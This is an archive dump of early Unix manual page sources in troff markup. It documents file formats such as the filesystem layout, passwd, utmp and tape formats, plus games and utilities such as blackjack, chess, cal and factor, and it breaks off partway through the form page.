-- /usr/man/man5/ascii.5 mode=0100664 uid=3 gid=3 atime=170022316 mtime=173059767 --
.th ASCII V 6/12/72
.sh NAME
ascii \*- map of ASCII character set
.sh SYNOPSIS
.bd "cat /usr/pub/ascii"
.sh DESCRIPTION
.it Ascii
is a map of the ASCII character set, to be printed as needed.
It contains:
.in 2
.nf

.cs R 20
|000 nul|001 soh|002 stx|003 etx|004 eot|005 enq|006 ack|007 bel|
|010 bs |011 ht |012 nl |013 vt |014 np |015 cr |016 so |017 si |
|020 dle|021 dc1|022 dc2|023 dc3|024 dc4|025 nak|026 syn|027 etb|
|030 can|031 em |032 sub|033 esc|034 fs |035 gs |036 rs |037 us |
|040 sp |041  ! |042  " |043  # |044  $ |045  % |046  & |047  \*a |
|050  ( |051  ) |052  * |053  + |054  , |055  \*- |056  . |057  / |
|060  0 |061  1 |062  2 |063  3 |064  4 |065  5 |066  6 |067  7 |
|070  8 |071  9 |072  : |073  ; |074  < |075  = |076  > |077  ? |
|100  @ |101  A |102  B |103  C |104  D |105  E |106  F |107  G |
|110  H |111  I |112  J |113  K |114  L |115  M |116  N |117  O |
|120  P |121  Q |122  R |123  S |124  T |125  U |126  V |127  W |
|130  X |131  Y |132  Z |133  [ |134  \\ |135  ] |136  ^ |137  \*_ |
|140  \*g |141  a |142  b |143  c |144  d |145  e |146  f |147  g |
|150  h |151  i |152  j |153  k |154  l |155  m |156  n |157  o |
|160  p |161  q |162  r |163  s |164  t |165  u |166  v |167  w |
|170  x |171  y |172  z |173  { |174  | |175  } |176  ~ |177 del|

.fi
.i0
.cs R
.sh FILES
found in /usr/pub
-- /usr/man/man5/core.5 mode=0100664 uid=3 gid=3 atime=170022318 mtime=173059767 --
.th CORE V 2/11/75
.sh NAME
core \*- format of core image file
.sh DESCRIPTION
UNIX
writes out a core image of a terminated
process when any of various errors occur.
See
.it "signal (II)"
for the list of reasons;
the most common are memory violations, illegal
instructions, bus errors, and user-generated
quit signals.
The core image is called ``core'' and is written in the process's
working directory (provided it can be; normal
access controls apply).
.s3
The first 1024 bytes of the core image
are a copy of the system's per-user
data for the process, including the registers
as they were at the time of the fault.
The
remainder represents the actual contents of
the user's core area when the core image
was written.
If the text segment
is write-protected and shared,
it is not dumped; otherwise the entire
address space is dumped.
.s3
The format of the
information in the first 1024 bytes
is described by
the
.it user
structure of the system.
The important stuff not detailed therein is the locations of the registers.
Here are their offsets.
The parenthesized numbers for the floating registers are
used if the floating-point hardware is in
single precision mode,
as indicated in the status register.
.s3
.lp +10 7
fpsr	0004
.lp +10 7
fr0	0006  (0006)
.lp +10 7
fr1	0036  (0022)
.lp +10 7
fr2	0046  (0026)
.lp +10 7
fr3	0056  (0032)
.lp +10 7
fr4	0016  (0012)
.lp +10 7
fr5	0026  (0016)
.lp +10 7
r0	1772
.lp +10 7
r1	1766
.lp +10 7
r2	1750
.lp +10 7
r3	1752
.lp +10 7
r4	1754
.lp +10 7
r5	1756
.lp +10 7
sp	1764
.lp +10 7
pc	1774
.lp +10 7
ps	1776
.s3
.i0
In general the debuggers
.it "db (I)"
and
.it "cdb (I)"
are sufficient to deal with core images.
.sh "SEE ALSO"
cdb (I), db (I), signal (II)
-- /usr/man/man5/directory.5 mode=0100664 uid=3 gid=3 atime=170022319 mtime=173059767 --
.th DIRECTORY V 9/10/73
.sh NAME
dir \*- format of directories
.sh DESCRIPTION
A directory
behaves exactly like an ordinary file, save that no
user may write into a directory.
The fact that a file is a directory is indicated by
a bit in the flag word of its i-node entry.
Directory entries are 16 bytes long.
The first word is the i-number of the file represented
by the entry, if non-zero; if zero, the entry is empty.
.s3
Bytes 2-15 represent the (14-character)
file name, null padded on the right.
These bytes are not cleared for empty slots.
.s3
By convention, the first two entries in each directory
are for ``\fB.\fR'' and ``\fB..\fR''.  The first is an entry for the
directory itself.  The second is for the parent
directory.
The meaning of ``\fB..\fR'' is modified for the root directory
of the master file system and for the root directories of removable
file systems.
In the first case, there is no parent, and in the second,
the system does not permit off-device references.
Therefore in both cases ``\fB..\fR'' has the
same meaning as ``\fB.\fR''.
.sh "SEE ALSO"
file system (V)
-- /usr/man/man5/dump.5 mode=0100664 uid=3 gid=3 atime=170022322 mtime=173059767 --
.th DUMP V 2/11/75
.sh NAME
dump \*- incremental dump tape format
.sh DESCRIPTION
The
.it dump
and
.it restor
commands are used to write
and read incremental dump magnetic tapes.
.s3
The dump tape consists of
blocks of 512-bytes each.
The first block has the following structure.
.s3
.nf
struct {
	int	isize;
	int	fsize;
	int	date[2];
	int	ddate[2];
	int	tsize;
};
.s3
.fi
.it Isize,
and
.it fsize
are the corresponding values from the
super block of the dumped file system.
(See file system (V).)
.it Date
is the date of the dump.
.it Ddate
is the incremental dump date.
The incremental dump contains
all files modified
between
.it ddate
and
.it date.
.it Tsize
is the number of blocks per
reel.
This block checksums to the octal value
031415.
.s3
Next there are enough whole tape blocks
to contain one word per file of the dumped file system.
This is
.it isize
divided by 16 rounded to the next higher integer.
The first word corresponds to i-node 1, the second to i-node 2, and
so forth.
If a word is zero, then the corresponding file
exists, but was not dumped.
(Was not modified after
.it ddate)
If the word is \*-1,
the file does not exist.
Other values for the word
indicate that the file was dumped and the value
is one more than the number of blocks it contains.
.s3
The rest of the tape
contains for each dumped file
a header block and the data blocks
from the file.
The header contains an exact copy of the
i-node
(see file system (V))
and also checksums to
031415.
The next-to-last word of the block contains the tape block number,
to aid in (unimplemented)
recovery after tape errors.
The number of data blocks per file is
directly specified by the control word for the file
and indirectly specified by the size in the i-node.
If these numbers differ,
the file was dumped with a `phase error'.
.sh "SEE ALSO"
dump (VIII), restor (VIII), file system(V)
-- /usr/man/man5/fs.5 mode=0110664 uid=3 gid=3 atime=170022324 mtime=173059767 --
.th "FILE SYSTEM" V 2/9/75
.sh NAME
fs \*- format of file system volume
.sh DESCRIPTION
Every
file system storage volume
(e.g. RF disk, RK disk, RP disk, DECtape reel)
has a common format for certain vital information.
Every such volume is divided into a certain number
of 256 word (512 byte) blocks.
Block 0 is unused and is available to contain
a bootstrap program, pack label, or other information.
.s3
Block 1 is the
.it "super block."
Starting from its first word, the format of a super-block is
.s3
.nf
struct {
	int	isize;
	int	fsize;
	int	nfree;
	int	free[100];
	int	ninode;
	int	inode[100];
	char	flock;
	char	ilock;
	char	fmod;
	int	time[2];
};
.s3
.fi
.it Isize
is the number of blocks devoted to the i-list,
which starts just after the super-block, in block 2.
.it Fsize
is the first block not potentially available for allocation
to a file.
These numbers are used by the system to
check for bad block numbers;
if an ``impossible'' block number is allocated from the free list
or is freed,
a diagnostic is written on the on-line console.
Moreover, the free array is cleared, so as to prevent further
allocation from a presumably corrupted free list.
.s3
The free list for each volume is maintained as
follows.
The
.it free
array contains, in
.it "free[1], ... , free[nfree\*-1],"
up to 99 numbers of free blocks.
.it Free[0]
is the block number of the head
of a chain of blocks constituting the free list.
The first word in each free-chain block is the number
(up to 100) of free-block numbers listed in the
next 100 words of this chain member.
The first of these 100 blocks is the link to the
next member of the chain.
To allocate a block:
decrement
.it nfree,
and the new block is
.it free[nfree].
If the new block number is 0,
there are no blocks left, so give an error.
If
.it nfree
became 0,
read in the block named by the new block number,
replace
.it nfree
by its first word,
and copy the block numbers in the next 100 words into the
.it free
array.
To free a block, check if
.it nfree
is 100; if so,
copy
.it nfree
and the
.it free
array into it,
write it out, and set
.it nfree
to 0.
In any event set
.it free[nfree]
to the freed block's number and
increment
.it nfree.
.s3
.it Ninode
is the number of free i-numbers in the
.it inode
array.
To allocate an i-node:
if
.it ninode
is greater than 0,
decrement it and return
.it inode[ninode].
If it was 0, read the i-list
and place the numbers of all free inodes
(up to 100) into the
.it inode
array,
then try again.
To free an i-node,
provided
.it ninode
is less than 100,
place its number into
.it inode[ninode]
and increment
.it ninode.
If
.it ninode
is already 100, don't bother to enter the freed i-node into any table.
This list of i-nodes is only to speed
up the allocation process; the information
as to whether the inode is really free
or not is maintained in the inode itself.
.s3
.it Flock
and
.it ilock
are flags maintained in the core
copy of the file system
while it is mounted
and their values on disk are immaterial.
The value of
.it fmod
on disk is likewise immaterial;
it is used as a flag to indicate that the super-block has
changed and should be copied to
the disk during the next periodic update of file
system information.
.s3
.it Time
is the last time the super-block of the file system was changed,
and is a double-precision representation
of the number of seconds that have elapsed
since
0000 Jan. 1 1970 (GMT).
During a reboot, the
.it time
of the super-block for the root file system
is used to set the system's idea of the time.
.s3
I-numbers begin at 1, and the storage for i-nodes
begins in block 2.
.tr |
Also, i-nodes are 32 bytes long, so 16 of them fit into a block.
Therefore, i-node
.it i
is located in block (\fIi\fR|+|31)|/|16, and begins
32\u\fB.\fR\d((\fIi\fR|+|31)|(mod 16) bytes from its start.
I-node 1 is reserved for the root directory of the file
system, but no other i-number has a built-in
meaning.
Each i-node represents one file.
The format of an i-node is as follows.
.s3
.nf
.if t .ta .5i 1.i 2.5i
struct {
	int	flags;	/* +0: see below */
	char	nlinks;	/* +2: number of links to file */
	char	uid;	/* +3: user ID of owner */
	char	gid;	/* +4: group ID of owner */
	char	size0;	/* +5: high byte of 24-bit size */
	int	size1;	/* +6: low word of 24-bit size */
	int	addr[8];	/* +8: block numbers or device number */
	int	actime[2];	/* +24: time of last access */
	int	modtime[2];	/* +28: time of last modification */
};
.dt
.fi
.s3
The flags are as follows:
.s3
.lp +10 9
100000	i-node is allocated
.lp +10 9
060000	2-bit file type:
.lp +15 9
000000	plain file
.lp +15 9
040000	directory
.lp +15 9
020000	character-type special file
.lp +15 9
060000	block-type special file.
.lp +10 9
010000	large file
.lp +10 9
004000	set user-ID on execution
.lp +10 9
002000	set group-ID on execution
.lp +10 9
000400	read (owner)
.lp +10 9
000200	write (owner)
.lp +10 9
000100	execute (owner)
.lp +10 9
000070	read, write, execute (group)
.lp +10 9
000007	read, write, execute (others)
.s3
.i0
Special files are recognized by their flags
and not by i-number.
A block-type special file is basically one which
can potentially be mounted as a file system;
a character-type special file cannot, though it is
not necessarily character-oriented.
For special files the high byte of the first address word
specifies the type of device; the low byte specifies
one of several devices of
that type.
The device type numbers
of block and character special files overlap.
.s3
The address words of ordinary files and directories
contain the numbers of the blocks in the
file (if it is small)
or the numbers of indirect blocks (if the file
is large).
Byte number
.it n
of a file is accessed as follows.
.it N
is divided by 512 to find its logical block number
(say
.it b
)
in the file.
If the file is small (flag 010000 is 0),
then
.it b
must be less than 8, and the physical
block number is
.it addr[b].
.s3
If the file is large,
.it b
is divided by 256 to yield
.it i.
If
.it i
is less than 7, then
.it addr[i]
is the physical block number of
the indirect block.
The remainder from the division 
yields the word in the indirect block
which contains the number of the block for
the sought-for byte.
.s3
If
.it i
is equal to 7,
then the file has become extra-large (huge),
and
.it addr[7]
is the address of a first indirect block.
Each word in this block
is the number of a second-level indirect block;
each word in the second-level indirect blocks points to a data block.
Notice that extra-large files are not marked by any mode
bit, but only by having
.it addr[7]
non-zero;
and that although this scheme allows for more than
256\*X256\*X512 = 33,554,432 bytes per file,
the length of files is stored in 24 bits
so in practice a file can be at most
16,777,216 bytes long.
.s3
For block
.it b
in a file to exist,
it
is not necessary that all blocks less than
.it b
exist.
A zero block number either in the address words of
the i-node or in an indirect block indicates that the
corresponding block has never been allocated.
Such a missing block reads as if it contained all zero words.
.sh "SEE ALSO"
icheck, dcheck (VIII)
-- /usr/man/man5/greek.5 mode=0100664 uid=3 gid=3 atime=170022326 mtime=173059767 --
.th GREEK V 10/31/72
.sh NAME
greek \*- graphics for extended TTY-37 type-box
.sh SYNOPSIS
.bd "cat /usr/pub/greek"
.sh DESCRIPTION
.it Greek
gives the mapping
from ascii
to the ``shift out'' graphics in effect between SO and SI 
on model 37 Teletypes
with a 128-character type-box.
It contains:
.s3
.nf
.if n .ig
.ta 1i .3i .75i 1i .3i .75i 1i  .3i
alpha	\(*a	A	beta	\(*b	B	gamma	\(*g	\\
GAMMA	\(*G	G	delta	\(*d	D	DELTA	\(*D	W
epsilon	\(*e	S	zeta	\(*z	Q	eta	\(*y	N
THETA	\(*H	T	theta	\(*h	O	lambda	\(*l	L
LAMBDA	\(*L	E	mu	\(*m	M	nu	\(*n	@
xi	\(*c	X	pi	\(*p	J	PI	\(*P	P
rho	\(*r	K	sigma	\(*s	Y	SIGMA	\(*S	R
tau	\(*t	I	phi	\(*f	U	PHI	\(*F	F
psi	\(*q	V	PSI	\(*Q	H	omega	\(*w	C
OMEGA	\(*W	Z	nabla	\(gr	[	not	\(no	\*_
partial	\(pd	]	integral	\(is	^
..
.if t .ig
.nf
alpha	A  A  |  beta	B  B  |  gamma	\\  \\
GAMMA	G  G  |  delta	D  D  |  DELTA	W  W
epsilon	S  S  |  zeta	Q  Q  |  eta	N  N
theta	T  T  |  THETA	O  O  |  lambda	L  L
LAMBDA	E  E  |  mu	M  M  |  nu	@  @
xi	X  X  |  pi	J  J  |  PI	P  P
rho	K  K  |  sigma	Y  Y  |  SIGMA	R  R
tau	I  I  |  phi	U  U  |  PHI	F  F
psi	V  V  |  PSI	H  H  |  omega	C  C
OMEGA	Z  Z  |  nabla	[  [  |  not	_  _
partial	]  ]  |  integral  ^  ^
..
.sh "SEE ALSO"
ascii (VII)
-- /usr/man/man5/group.5 mode=0100664 uid=3 gid=3 atime=170022327 mtime=173059767 --
.th GROUP V 2/10/75
.sh NAME
group \*- group file
.sh DESCRIPTION
.it Group
contains for each group the
following information:
.s3
.lp +10 5
group name
.lp +10 5
encrypted password
.lp +10 5
numerical group ID
.lp +10 5
a comma separated list of all users allowed in the group
.s3
.i0
This is an ASCII file.
The fields are separated
by colons;
Each group is separated from the next by a new-line.
If the password field is null, no password is demanded.
.s3
This file resides in directory /etc.
Because of the encrypted
passwords, it can and does have general read
permission and can be used, for example,
to map numerical group ID's to names.
.sh FILES
/etc/group
.sh "SEE ALSO"
newgrp (I), login (I), crypt (III), passwd (I)
-- /usr/man/man5/mtab.5 mode=0100664 uid=3 gid=3 atime=170022327 mtime=173059767 --
.th MTAB V 1/6/74
.sh NAME
mtab \*- mounted file system table
.sh DESCRIPTION
.it Mtab
resides in directory
.it /etc
and contains a table of devices mounted by the
.it mount
command.
.it Umount
removes entries.
.s3
Each entry is 64 bytes long;
the first 32 are the null-padded name of the
place where the special file is mounted;
the second 32 are the null-padded name of the special
file.
The special file has all its directories
stripped away;
that is, everything through the last ``/'' is thrown
away.
.s3
This table is present only so people can look at it.
It does not matter to
.it mount
if there are duplicated entries nor
to
.it umount
if a name cannot be found.
.sh FILES
/etc/mtab
.sh "SEE ALSO"
mount (VIII), umount (VIII)
.sh BUGS
-- /usr/man/man5/passwd.5 mode=0100664 uid=3 gid=3 atime=170022329 mtime=173059767 --
.th PASSWD V 9/10/73
.sh NAME
passwd \*- password file
.sh DESCRIPTION
.it Passwd
contains for each user the
following information:
.s3
.lp +10 5
name (login name, contains no upper case)
.lp +10 5
encrypted password
.lp +10 5
numerical user ID
.lp +10 5
numerical group ID (for now, always 1)
.lp +10 5
GCOS job number, box number, optional GCOS user-id
.lp +10 5
initial working directory
.lp +10 5
program to use as Shell
.s3
.i0
This is an ASCII file.  Each field within each user's entry
is separated from the next by a colon.
The GCOS field is used only when communicating with that
system, and in other installations can contain
any desired information.
Each user is separated from the next by a new-line.
If the password field is null, no password is demanded;
if the Shell field is null, the Shell itself
is used.
.s3
This file resides in directory /etc.
Because of the encrypted
passwords, it can and does have general read
permission and can be used, for example,
to map numerical user ID's to names.
.sh FILES
/etc/passwd
.sh "SEE ALSO"
login (I), crypt (III), passwd (I), group (V)
-- /usr/man/man5/tabs.5 mode=0100664 uid=3 gid=3 atime=170022331 mtime=173059767 --
.th TABS V 6/15/72
.sh NAME
tabs \*- set tab stops
.sh SYNOPSIS
.bd "cat /usr/pub/tabs"
.sh DESCRIPTION
Printing this file on a suitable terminal
sets tab stops every 8 columns.
Suitable terminals include the Teletype model 37 and
the GE TermiNet 300.
.s3
These tab stop settings are
desirable because UNIX assumes them
in calculating delays.
-- /usr/man/man5/tp.5 mode=0100664 uid=3 gid=3 atime=170022333 mtime=173059767 --
.th TP V 9/10/73
.sh NAME
tp \*- DEC/mag tape formats
.sh DESCRIPTION
The
command
.it tp
dumps files to and extracts files from
DECtape and magtape.
The formats of these tapes are the same except
that magtapes have larger directories.
.s3
Block zero contains a
copy of a stand-alone bootstrap program.
See boot procedures (VIII).
.s3
Blocks 1 through 24
for DECtape (1 through 62 for magtape)
contain a directory of the tape.
There are 192 (resp. 496) entries in the directory;
8 entries per block;
64 bytes per entry.
Each entry has the following format:
.s3
.lp +24 20
path name	32 bytes
.lp +24 20
mode	2 bytes
.lp +24 20
uid	1 byte
.lp +24 20
gid	1 byte
.lp +24 20
unused	1 byte
.lp +24 20
size	3 bytes
.lp +24 20
time modified	4 bytes
.lp +24 20
tape address	2 bytes
.lp +24 20
unused	16 bytes
.lp +24 20
check sum	2 bytes
.s3
.i0
The path name entry is the path name of the
file when put on the tape.
If the pathname starts with a zero word,
the entry is empty.
It is at most 32 bytes long and ends in a null byte.
Mode, uid, gid, size and time modified
are the same as described under i-nodes (file system (V)).
The tape address is the tape block number of the start of
the contents of the file.
Every file
starts on a block boundary.
The file occupies (size+511)/512 blocks
of continuous tape.
The checksum entry has a value such that
the sum of the 32 words of the directory entry is zero.
.s3
Blocks 25 (resp. 63) on are available for file storage.
.s3
A fake entry (see tp (I))
has a size of zero.
.sh "SEE ALSO"
file system (V), tp (I)
-- /usr/man/man5/ttys.5 mode=0100664 uid=3 gid=3 atime=170022333 mtime=173059768 --
.th TTYS V 2/11/75
.sh NAME
ttys \*- typewriter initialization data
.sh DESCRIPTION
The
.it ttys
file is read by the
.it init
program and specifies
which typewriter special files are to have
a process created for them which will allow people to
log in.
It consists of lines of 3 characters each.
.s3
The first character is either `0' or `1';
the former causes the line to be ignored,
the latter causes it to be effective.
The second character is the last character in the name
of a typewriter; e.g. \fIx\fR refers to
the file `/dev/tty\fIx\fR'.
The third character is used as an argument
to the
.it getty
program,
which performs such tasks as baud-rate recognition,
reading the login name,
and calling
.it login.
For normal lines,
the character is `0';
other characters can be used, for example, with hard-wired terminals
where speed recognition is unnecessary
or which have special characteristics.
(Getty will have to be fixed in such cases.)
.sh FILES
/etc/ttys
.sh "SEE ALSO"
init (VIII), getty (VIII), login (I)
-- /usr/man/man5/utmp.5 mode=0100664 uid=3 gid=3 atime=170022334 mtime=173059768 --
.th UTMP V 9/10/73
.sh NAME
utmp \*- user information
.sh DESCRIPTION
This
file allows one to discover information about who is currently
using UNIX.
The file is binary; each entry is 16(10) bytes long.
The first eight bytes contain a user's login name or
are null if the table slot is unused.
The low order byte of the next word contains the last
character of a typewriter name.
The next two words contain the user's login time.
The last word is unused.
.sh FILES
/etc/utmp
.sh "SEE ALSO"
init (VIII) and login (I), which maintain the file;
who (I), which interprets it.
-- /usr/man/man5/wtmp.5 mode=0100664 uid=3 gid=3 atime=170022335 mtime=173059768 --
.th WTMP V 2/22/74
.sh NAME
wtmp \*- user login history
.sh DESCRIPTION
This
file records all logins and logouts.
Its format is exactly like utmp (V) except that
a null user name indicates a logout on the associated
typewriter.
Furthermore, the typewriter name `~' indicates that the
system was rebooted at the indicated time;
the adjacent pair of entries with typewriter names
`|' and `}' indicate the system-maintained time
just before and just after a
.it date
command has changed the system's idea of the time.
.s3
.it Wtmp
is maintained by login (I) and init (VIII).
Neither of these programs creates the file,
so if it is removed record-keeping is turned off.
It is summarized by ac (VIII).
.sh FILES
/usr/adm/wtmp
.sh "SEE ALSO"
utmp (V), login (I), init (VIII), ac (VIII), who (I)
-- /usr/man/man6 mode=0140775 uid=3 gid=3 atime=173059780 mtime=173059709 --
-- /usr/man/man6/azel.6 mode=0100664 uid=3 gid=3 atime=170022341 mtime=173059781 --
.tr |
.th AZEL VI 6/3/74
.sh NAME
azel \*- satellite predictions
.sh SYNOPSIS
.bd azel
[
.bd \-d
] [
.bd \-l
] satellite1 [
.bd \-d
] [
.bd \-l
] satellite2 ...
.sh DESCRIPTION
.it Azel
predicts, in convenient form,
the apparent trajectories of Earth satellites
whose orbital elements are given in the
argument files.
If a given satellite name cannot be read, an attempt is made to find it
in a directory of satellites maintained by the
programs's author.
The
.bd \-d
option causes
.it azel
to ask for a date and read line|1 data (see below) from the standard
input.
The
.bd \-l
option causes
.it azel
to ask for the observer's latitude, west-longitude,
and height above sea level.
.s3
For each satellite given
the program types its full name,
the date,
and a sequence of lines each containing a time,
an azimuth, an elevation,
a distance, and a visual magnitude.
Each such line indicates that:
at the indicated time,
the satellite may be seen from Murray Hill
(or provided location)
at the indicated azimuth and elevation, and that its distance
and apparent magnitude are as given.
Predictions are printed only when
the sky is dark (sun more than 5 degrees below the horizon)
and when the satellite is not eclipsed by the earth's shadow.
Satellites which have not been seen and verified will
not have had their visual magnitude level set correctly.
.s3
All times input and output by
.it azel
are GMT (Universal Time).
.s3
The satellites for which elements are maintained are:
.s3
.lp +10 10
sla,b,e,f,k	Skylab A through Skylab K.
Skylab A is the laboratory;
B was the rocket but it has crashed.
A and probably K have been verified.
.s3
.lp +10 10
cop	Copernicus I. Never verified.
.s3
.lp +10 10
oao	Orbiting Astronomical Observatory.
Seen and verified.
.s3
.lp +10 10
pag	Pageos I.
Seen and verified;
fairly dim (typically 2nd-3rd magnitude), but elements are extremely accurate.
.s3
.lp +10 10
exp19	Explorer 19; seen and verified,
but quite dim (4th-5th magnitude) and fast-moving.
.s3
.lp +10 10
c103b, c156b, c184b, c206b, c220b, c461b, c500b
.br
Various of the USSR Cosmos series; none seen.
.s3
.lp +10 10
7276a	Unnamed (satellite # 72-76A); not seen.
.s3
.i0
The element files used by
.it azel
contain five lines.
The first line gives
a year, month number,
day, hour, and minute
at which the program begins its consideration of the satellite,
followed by a number of minutes and an interval in minutes.
If the year, month, and day
are 0, they are taken to be the current date (taken to change at 6 A.M. local time).
The output report starts at the indicated epoch and
prints the position of the satellite
for the indicated number of minutes
at times separated by the indicated interval.
This line is ended by two numbers
which specify options to the program governing
the completeness of the report; they are ordinarily
both ``1''.
The first option flag suppresses output when the sky is not dark;
the second supresses output when the satellite is eclipsed by the
earth's shadow.
The next line of an element file is the full name of the satellite.
The next three are the elements themselves
(including certain derivatives of the elements).
.sh FILES
/usr/jfo/el/* \*- orbital element files
.sh "SEE ALSO"
sky (VI)
.sh AUTHOR
J. F. Ossanna
.sh BUGS
-- /usr/man/man6/bj.6 mode=0100664 uid=3 gid=3 atime=170022342 mtime=173059781 --
.th BJ VI 3/15/72
.sh NAME
bj \*- the game of black jack
.sh SYNOPSIS
.bd /usr/games/bj
.sh DESCRIPTION
.it Bj
is a serious attempt at
simulating the dealer
in the game of black jack (or twenty-one)
as might be found in Reno.
The following rules apply:
.s3
.lp +5 5
The bet is $2 every hand.
.s3
A player `natural' (black jack) pays $3.
A dealer natural loses $2.
Both dealer and player naturals
is a `push' (no money exchange).
.s3
If the dealer has an ace up,
the player is allowed to make an `insurance'
bet against the chance of a dealer natural.
If this bet is not taken, play resumes as normal.
If the bet is taken, it is a side bet
where the player wins $2 if the dealer has
a natural and loses $1 if the dealer does not.
.s3
If the player is dealt two cards
of the same value, he is allowed to
`double'.
He is allowed to play two
hands, each with one of these cards.
(The bet is doubled also; $2 on each hand.)
.s3
If a dealt hand
has a total of ten or eleven,
the player may `double down'.
He may double the bet ($2 to $4)
and receive exactly one more card on that hand.
.s3
Under normal play,
the player may `hit' (draw a card)
as long as his total is not over twenty-one.
If the player `busts' (goes over twenty-one),
the dealer wins the bet.
.s3
When the player `stands' (decides not to hit),
the dealer hits until he attains
a total of seventeen or more.
If the dealer busts, the player wins the bet.
.s3
If both player and dealer stand,
the one with the largest total wins.
A tie is a push.
.s3
.i0
The machine deals and keeps score.
The following questions will be asked at
appropriate times.
Each question is
answered by
.bd y
followed by a new line for `yes',
or just new line for `no'.
.s3
?		(means, ``do you want a hit?'')
.br
Insurance?
.br
Double down?
.s3
Every time the deck is shuffled,
the dealer so states and the `action' (total bet)
and `standing' (total won or lost)
is printed.
To exit, hit the interrupt key (DEL)
and the action and standing will be printed.
.sh BUGS
-- /usr/man/man6/cal.6 mode=0100664 uid=3 gid=3 atime=170022343 mtime=173059781 --
.th CAL VI 11/1/73
.sh NAME
cal \*- print calendar
.sh SYNOPSIS
.bd cal
[ month ] year
.sh DESCRIPTION
.it Cal
prints a calendar for the specified year.
If a month is also specified, a calendar
just for that month is printed.
.it Year
can be between 1
and 9999.
The
.it month
is a number between 1 and 12.
The calendar
produced is that for England and her colonies.
.s3
Try September 1752.
.sh BUGS
The year is always considered to start in January even though this
is historically naive.
-- /usr/man/man6/chess.6 mode=0100664 uid=3 gid=3 atime=170022344 mtime=173059781 --
.th CHESS VI 11/1/73
.sh NAME
chess \*- the game of chess
.sh SYNOPSIS
.bd /usr/games/chess
.sh DESCRIPTION
.it Chess
is a computer program that plays class D chess.
Moves may be given either in standard (descriptive) notation
or in algebraic notation.
The symbol `+' is used to specify check;
`o-o' and `o-o-o' specify castling.
To play black, type `first';
to print the board, type an empty line.
.s3
Each move is echoed in the appropriate notation followed by
the program's reply.
.sh FILES
/usr/lib/book		opening `book'
.sh DIAGNOSTICS
The most cryptic diagnostic is `eh?' which
means that the input was syntactically incorrect.
.sh WARNING
Over-use of this program
will cause it to go away.
.sh BUGS
Pawns may be promoted only to queens.
-- /usr/man/man6/col.6 mode=0100664 uid=3 gid=3 atime=170022345 mtime=173059781 --
.th COL VI 5/20/74
.sh NAME
col \*- filter reverse line feeds
.sh SYNOPSIS
.bd col
.sh DESCRIPTION
.it Col
reads the standard input and writes the standard output.
It performs the line overlays implied by reverse line
feeds (ascii code ESC-7).
.it Col
is particularly useful for filtering multicolumn
output made with the `.rt' command of
.it nroff.
.sh "SEE ALSO"
nroff (I)
.sh BUGS
Can't back up more than 102 lines.
-- /usr/man/man6/cubic.6 mode=0100664 uid=3 gid=3 atime=170022346 mtime=173059781 --
.th CUBIC VI 11/1/73
.sh NAME
cubic \*- three dimensional tic-tac-toe
.sh SYNOPSIS
.bd /usr/games/cubic
.sh DESCRIPTION
.it Cubic
plays the game of
three dimensional
4\*X4\*X4 tic-tac-toe.
.hc ~
Moves are given by the three ~digits
(each 1-4)
specifying the coordinate of the square
to be played.
.sh WARNING
Too much playing of the game will cause it to disappear.
.sh BUGS
-- /usr/man/man6/factor.6 mode=0100664 uid=3 gid=3 atime=170022346 mtime=173059781 --
.th FACTOR VI 1/15/73
.sh NAME
factor \*- discover prime factors of a number
.sh SYNOPSIS
.bd factor [ number ]
.sh DESCRIPTION
When
.it factor
is invoked without an argument, it waits for a number to be typed in.
If you type in a positive
number less than 2\u\s756\s0\d (about
.if n 7.2e16)
.if t 7.2\(mu10\u\s716\s0\d\|)
it will factor the number and print its prime factors; each one is printed
the proper number of times.
Then it waits for another number.
It exits if it encounters a zero or any non-numeric character.
.s3
If
.it factor
is invoked with an argument, it factors the number
as above and then exits.
.s3
Maximum time to factor is proportional to
.if n sqrt(n)
.if t \(sr\o'\fIn\fR\(rn'
and occurs when
.it n
is prime
or the square of a prime.
It takes 1 minute to factor a prime
near
10\u\s713\s0\d.
.sh DIAGNOSTICS
`Ouch.' for input out of range or for garbage input.
.sh BUGS
-- /usr/man/man6/fed.6 mode=0100664 uid=3 gid=3 atime=170022347 mtime=173059781 --
.th FED VI 1/15/73
.sh NAME
fed \*- edit form letter memory
.sh SYNOPSIS
.bd fed
.sh DESCRIPTION
.it Fed
is used to edit a form letter associative memory
file,
.bd form.m,
which consists of named strings.
Commands consist of single letters followed by a list of
string names separated by a single space and ending with a
new line.
The conventions of the Shell with respect to `*' and `?' hold for
all commands but \fBm\fR.
The commands are:
.s3
.lp +3 3
\fBe\fR name ...
.br
.it Fed
writes the string whose name is
.it name
onto a temporary file
and executes
.it ed.
On exit from the
\fIed\fR the temporary file is copied back into the associative
memory.
Each argument is operated on separately.
Be sure to give an editor
.it w
command (without a filename)
to rewrite
.it fed's
temporary file
before quitting out of
.it ed.
.s3
.lp +3 3
.bd d
[ name ... ]
.br
deletes a string and its name from the memory.  When called with
no arguments
.bd d
operates in a verbose mode typing each string
name and deleting only if a
.bd y
is typed.  A
.bd q
response returns
to \fIfed\fR's command level.  Any other response does nothing.
.s3
.lp +3 3
.bd m
name1 name2 ...
.br
(move) changes the name of name1 to name2 and removes previous
string name2 if one exists.  Several pairs of arguments may be given.
Literal strings are expected for the names.
.s3
.lp +3 3
.bd n
[ name ... ]
.br
(names) lists the string names in the memory.  If called with
the optional arguments, it just lists those requested.
.s3
.lp +3 3
.bd p
name ...
.br
prints the contents of the strings with names given by the arguments.
.s3
.lp +3 3
.bd q
.br
returns to the system.
.s3
.lp +3 3
.bd c
[
.bd p
] [
.bd f
]
.br
checks the associative memory file for consistency
and reports the number of free headers and blocks.
The optional arguments do the following:
.s3
.lp +6 3
\fBp\fR	causes any unaccounted-for string to be 
printed.
.s3
.lp +6 3
\fBf\fR	fixes broken memories by adding 
unaccounted-for headers to free
storage and removing references to
released headers from associative
memory.
.br
.i0
.dt
.sh FILES
/tmp/ftmp?	temporary
.br
form.m		associative memory
.sh "SEE ALSO"
form (VI), ed (I), sh (I)
.sh WARNING
It
is legal but unwise to have string names
with blanks, `*' or `?' in them.
.sh BUGS
-- /usr/man/man6/form.6 mode=0100664 uid=3 gid=3 atime=170022349 mtime=173059781 --
.th FORM VI 6/15/72
.sh NAME
form \*- form letter generator
.sh SYNOPSIS
.bd form
proto arg ...
.sh DESCRIPTION
.it Form
generates a form letter from a prototype
letter, an associative memory, arguments and in a special case, the
current date.
.s3
If
.it form
is invoked with the
.it proto
argument \fIx\fR, the associative memory is
searched for an entry with name \fIx\fR and the contents filed under that name are
used as the prototype.
If the search fails, the message `[\fIx\fR]:' is typed on
the console and whatever text is typed in from the console, terminated by
two new lines, is used as the prototype.
